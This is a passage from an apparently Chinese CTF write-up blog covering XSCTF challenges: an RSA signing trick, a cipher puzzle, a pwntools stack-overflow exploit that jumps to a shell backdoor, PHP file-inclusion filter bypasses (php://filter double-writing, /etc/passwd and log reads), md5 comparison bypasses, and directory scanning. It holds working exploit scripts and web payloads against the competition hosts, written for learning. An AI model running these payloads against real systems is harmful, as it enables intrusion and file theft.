class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">gift = <span class="built_in">pow</span>(m, d, n)</span><br><span class="line">print(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">print(<span class="string">f&#x27;gift = <span class="subst">&#123;gift&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117</span></span><br><span class="line"><span class="string">gift = 44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据公钥加密算法的特性，公私钥互换效果是一样的，这里用私钥加密（签名），就可以使用公钥解密（验证）</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308</span></span><br><span class="line">n = <span class="number">130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117</span></span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, e, n)))</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;H3re_i5_@_Gif7_f0r_y0u_From_Euler:)))))!&#125;</code></p><h2 id="你说你是凯撒大帝尊嘟假嘟啊"><a href="#你说你是凯撒大帝尊嘟假嘟啊" class="headerlink" title="你说你是凯撒大帝尊嘟假嘟啊"></a>你说你是凯撒大帝尊嘟假嘟啊</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Öv0 0vo O.0 O_Ö Övo 0vo ov0 ovÖ o.Ö owÖ 0.o OwÖ o.O Ö.O O_0 o_Ö Ö_0 OwÖ Ov0 0wÖ Ö.Ö owO 0v0 o.O o.Ö Ö.0 o.0 ovO o.Ö Ö.o 0vo Ow0 Ö.Ö owo 0_0 0.0 o.Ö Ö.O O.0 O_0 o_O 0vÖ owo </span><br></pre></td></tr></table></figure><p><a href="https://zdjd.vercel.app/">尊嘟假嘟O.o (zdjd.vercel.app)</a></p><p>解密之后凯撒爆破</p><p><code>XSCTF&#123;gr3at_y0u_aRe_reA1_CaesAr&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF_warmup</title>
      <link href="2024/11/04/xsctf_warmup/"/>
      <url>2024/11/04/xsctf_warmup/</url>
      
        <content type="html"><![CDATA[<h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>附件：babystack</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  init_func(argc, argv, envp);</span><br><span class="line">  start_show();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  __isoc99_scanf(v4);</span><br><span class="line">  vuln(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">vuln</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0x7FFFFFFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402038);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_40205D);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x8848</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>对于第一个比较，直接输入-1</li><li>对于read函数，输入80+8个字符之后再输入需要返回的地址（backdoor）即可</li></ul><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">40054</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">sysaddr = elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">print(<span class="string">&#x27;0x%x&#x27;</span>%sysaddr)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">80</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(sysaddr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>正常来说这么写没问题，但是运行的时候不会返回shell<br>原因估计是堆栈平衡之类的问题，解决的方法是直接返回到调用system函数的地址，跳过栈操作<br><img src="https://s2.loli.net/2024/11/05/IOUJnwELYt7TCu5.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/IOUJnwELYt7TCu5.png" srcset="data:image/png;base64,666" alt="image"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">40054</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">80</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x4012bf</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>坑</strong></p><ul><li>当返回到后门函数行不通的时候，返回到调用system函数的语句</li><li>Windows和Linux平台运行同一份exp的结果可能不同</li></ul><p><code>XSCTF&#123;E49AA5B5-B7DA-769B-4AE7-F40A17E09A04&#125;</code></p><h2 id="Badbad-filename"><a href="#Badbad-filename" class="headerlink" title="Badbad_filename"></a>Badbad_filename</h2><p><code>GET me a filename and I&#39;ll include it!</code><br>测试一下发现过滤了php、filter、base、data、file等关键字<br>然后就搜一堆绕过的方法</p><ul><li>如果base被绕过了，可以使用url编码convert往后，resource往前的字符<code>?filename=pHp://filtEr/convert.%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565/resource=</code></li><li>除了测试文件<code>/etc/passwd</code>之外，如果是nginx，可以考虑读日志<code>/var/log/nginx/access.log</code></li><li>如果读<code>flag.php</code>，记得先访问一下看看页面是否存在</li></ul><p>最后，这道题的解法是最简单的双写绕过<br><code>?filename=pphphp://filfilterter/convert.basbasee64-encode/resource=flag.pphphp</code></p><p><code>XSCTF&#123;d0ubLe_Wr1te_2_byPass&#125;</code></p><p>麻了</p><h2 id="canyoupassit"><a href="#canyoupassit" class="headerlink" title="canyoupassit"></a>canyoupassit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a1&#x27;</span>] != $_POST[<span class="string">&#x27;b1&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a1&#x27;</span>] == md5($_POST[<span class="string">&#x27;b1&#x27;</span>])))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;恭喜你过了第一关!&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;就这?&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;key&#x27;</span>] == md5($_POST[<span class="string">&#x27;key&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;恭喜你过了第二关!&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;再看看?&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">$now = time();  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a2&#x27;</span>] != $_POST[<span class="string">&#x27;b2&#x27;</span>] &amp;&amp; str_starts_with($_POST[<span class="string">&#x27;a2&#x27;</span>], $now) &amp;&amp; str_starts_with($_POST[<span class="string">&#x27;b2&#x27;</span>], $now) &amp;&amp; md5($_POST[<span class="string">&#x27;a2&#x27;</span>] === md5($_POST[<span class="string">&#x27;b2&#x27;</span>])))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;恭喜你过了第三关!&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;/flag&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;真可惜，就差最后一步了&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一道有关md5绕过的题目，主要分为三个部分</p><ol><li>不同值的变量，md5的值是一样的（弱比较） – md5弱碰撞</li><li>md5值等于自身的值（<strong>弱比较</strong>） – 0e绕过</li><li>不同值的md5是一样的（<strong>强比较</strong>），且要求两个值都有特定前缀</li></ol><p>解决的方法如下：</p><ol><li>对于弱比较的md5值，可以直接百度特定的值<ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a<br>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</li></ul></li><li>对于若比较的<code>$a == md5($a)</code>，存在0e开头的值md5之后还是0e开头，这样在弱比较中仍然相等，如<code>0e215962017</code></li><li>对于强比较，可以采用md5强碰撞的方式，网上有特定的值可以满足值不同但是md5值相同，但是这里存在另外一个问题，就是这两个值的前缀必须是当前时间，这就需要自己生成特定的两个值，使用<code>fastcoll</code>工具，可以生成特定前缀的值来满足条件，这个特定前缀就是当前时间</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">int</span>(time.time()+<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;t.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(t))</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;fastcoll_v1.0.0.5.exe t.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">a2 = <span class="built_in">open</span>(<span class="string">&#x27;t_msg1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">b2 = <span class="built_in">open</span>(<span class="string">&#x27;t_msg2.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.248.97.213:30038/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a1&#x27;</span>: <span class="string">&#x27;s214587387a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b1&#x27;</span>: <span class="string">&#x27;s155964671a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span> : <span class="string">&#x27;0e215962017&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a2&#x27;</span>: a2,</span><br><span class="line">    <span class="string">&#x27;b2&#x27;</span>: b2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>一些要注意的点</p><ul><li>特定前缀的时间最好往后调一调，避免因网络问题导致错过时间</li><li>生成的两个txt需要以二进制的形式读取</li></ul><p><code>flag&#123;y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^&#125;</code></p><h2 id="Ezgame"><a href="#Ezgame" class="headerlink" title="Ezgame"></a>Ezgame</h2><p>进入是一个小游戏，要求达到非常高的分数</p><p><img src="https://s2.loli.net/2024/11/05/wSjykCZa9XJ7edM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/wSjykCZa9XJ7edM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026193535.png"></p><p>直接玩肯定不现实，于是翻翻js代码<br>因为不是通过php记录分数的，所以不可以使用POST请求之类的修改分数</p><p>入手的思路是通过浏览器控制台访问所有的对象，然后找到存储分数的变量，直接在控制台修改变量<br>翻了十几份代码之后去控制台查看对象，从全局对象入手，最终找到了这些<br><img src="https://s2.loli.net/2024/11/05/FMiTn2lvewczJ83.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/FMiTn2lvewczJ83.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194009.png"></p><p><img src="https://s2.loli.net/2024/11/05/AzUIKpGtRdwu5gM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/AzUIKpGtRdwu5gM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194244.png"><br>看起来像是存储游戏角色的变量<br>于是直接修改其中的gold和kills以及high_score（不知道改哪个，干脆全改了)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;o1&quot;</span>,<span class="attr">&quot;ownerId&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;position&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">359.04999999999956</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">154.2499999999999</span>&#125;,<span class="attr">&quot;size&quot;</span>:&#123;<span class="attr">&quot;width&quot;</span>:<span class="number">32</span>,<span class="attr">&quot;height&quot;</span>:<span class="number">32</span>&#125;,<span class="attr">&quot;direction&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">0</span>&#125;,<span class="attr">&quot;facing&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">0</span>&#125;,<span class="attr">&quot;speed&quot;</span>:<span class="number">150</span>,<span class="attr">&quot;team&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;hitPoints&quot;</span>:<span class="number">100</span>,<span class="attr">&quot;damage&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spriteSheet&quot;</span>:<span class="string">&quot;characters&quot;</span>,<span class="attr">&quot;spriteX&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spriteY&quot;</span>:<span class="number">992</span>,<span class="attr">&quot;spriteAlign&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;animated&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;animFrameIndex&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;animNumFrames&quot;</span>:<span class="number">2</span>,<span class="attr">&quot;animDelay&quot;</span>:<span class="number">200</span>,<span class="attr">&quot;animElapsed&quot;</span>:<span class="number">16</span>,<span class="attr">&quot;spawnFrameIndex&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spawnFrameCount&quot;</span>:<span class="number">2</span>,<span class="attr">&quot;spawnFramesX&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spawnFramesY&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;angle&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;rotateSpeed&quot;</span>:<span class="number">400</span>,<span class="attr">&quot;rotate&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;worth&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;ttl&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;ttlElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;alpha&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;alphaMod&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;gibletSize&quot;</span>:<span class="string">&quot;small&quot;</span>,<span class="attr">&quot;cooldown&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;cooldownElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;autoFire&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;soundAttacks&quot;</span>:<span class="string">&quot;hero_attacks&quot;</span>,<span class="attr">&quot;soundDamage&quot;</span>:<span class="string">&quot;hero_damage&quot;</span>,<span class="attr">&quot;soundDies&quot;</span>:<span class="string">&quot;hero_dies&quot;</span>,<span class="attr">&quot;alive&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;states&quot;</span>:[&#123;<span class="attr">&quot;type&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;timer&quot;</span>:&#123;<span class="attr">&quot;elapsed_ms&quot;</span>:<span class="number">43298</span>,<span class="attr">&quot;ttl&quot;</span>:<span class="number">0</span>&#125;&#125;,<span class="literal">null</span>,<span class="literal">null</span>],<span class="attr">&quot;currentWeaponIndex&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;collidable&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;bounce&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;piercing&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;achievementId&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;deathsForAchievement&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;ignoreLogDeath&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;damageType&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;drawIndex&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;moveChangeElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;moveChangeDelay&quot;</span>:<span class="number">500</span>,<span class="attr">&quot;wounds&quot;</span>:<span class="number">15</span>,<span class="attr">&quot;weapons&quot;</span>:[&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;h_sword&quot;</span>,<span class="attr">&quot;count&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;h_spear&quot;</span>,<span class="attr">&quot;count&quot;</span>:<span class="number">82</span>&#125;],<span class="attr">&quot;gold&quot;</span>:<span class="number">1000000000</span>,<span class="attr">&quot;kills&quot;</span>:<span class="number">10000000000</span>,<span class="attr">&quot;timesWounded&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;totalDamageTaken&quot;</span>:<span class="number">15</span>,<span class="attr">&quot;shotsFired&quot;</span>:<span class="number">108</span>,<span class="attr">&quot;shotsLanded&quot;</span>:<span class="number">65</span>,<span class="attr">&quot;shotsPerWeapon&quot;</span>:&#123;<span class="attr">&quot;h_sword&quot;</span>:<span class="number">28</span>,<span class="attr">&quot;h_knife&quot;</span>:<span class="number">31</span>,<span class="attr">&quot;h_spear&quot;</span>:<span class="number">18</span>&#125;,<span class="attr">&quot;meatEaten&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;cheater&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;phase&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;phaseInit&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;lootTable&quot;</span>:[],<span class="attr">&quot;killSwitch&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;hero&quot;</span>,<span class="attr">&quot;role&quot;</span>:<span class="string">&quot;hero&quot;</span>,<span class="attr">&quot;isMeatboy&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;bloodTimer&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>然后返回游戏发现数据没有变化<br>以为错了，退出去，然后在主界面发现了flag<br><img src="https://s2.loli.net/2024/11/05/3pGuqBM7yFb2JwI.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/3pGuqBM7yFb2JwI.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194359.png"></p><p><code>flag&#123;basju_D0G006706_iajdisaia&#125;</code></p><h2 id="hardphp"><a href="#hardphp" class="headerlink" title="hardphp"></a>hardphp</h2><p>进入题目什么都没有，只有一句话<code>尝试大声喊出v我50!!!我就会给你flag</code><br>只能扫后台了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">~$ dirsearch -u http://43.248.97.213:30090/</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/xr/.dirsearch/reports/43.248.97.213-30090/-_24-10-28_22-14-33.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/xr/.dirsearch/logs/errors-24-10-28_22-14-33.log</span><br><span class="line"></span><br><span class="line">Target: http://43.248.97.213:30090/</span><br><span class="line"></span><br><span class="line">[22:14:33] Starting:</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.orig</span><br><span class="line">[22:14:37] 403 -  225B  - /.htaccess.sample</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.bak1</span><br><span class="line">[22:14:37] 403 -  220B  - /.ht_wsr.txt</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.save</span><br><span class="line">[22:14:37] 403 -  224B  - /.htaccess_extra</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccess_sc</span><br><span class="line">[22:14:38] 403 -  223B  - /.htaccess_orig</span><br><span class="line">[22:14:38] 403 -  214B  - /.html</span><br><span class="line">[22:14:38] 403 -  219B  - /.htpasswds</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccessBAK</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccessOLD</span><br><span class="line">[22:14:38] 403 -  213B  - /.htm</span><br><span class="line">[22:14:38] 403 -  222B  - /.htaccessOLD2</span><br><span class="line">[22:14:38] 403 -  220B  - /.httr-oauth</span><br><span class="line">[22:14:38] 403 -  223B  - /.htpasswd_test</span><br><span class="line">[22:15:05] 200 -  304B  - /index.php</span><br><span class="line">[22:15:05] 200 -  304B  - /index.php/login/</span><br><span class="line">[22:15:17] 403 -  222B  - /server-status</span><br><span class="line">[22:15:17] 403 -  223B  - /server-status/</span><br><span class="line">[22:15:25] 200 -  825B  - /www.zip</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><p> 扫出来三个，其中<a href="http://www.zip是网站的备份/">www.zip是网站的备份</a><br>解压之后发现有个<code>flagflaghhh.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line">$input = $_POST[<span class="string">&#x27;a&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span> (<span 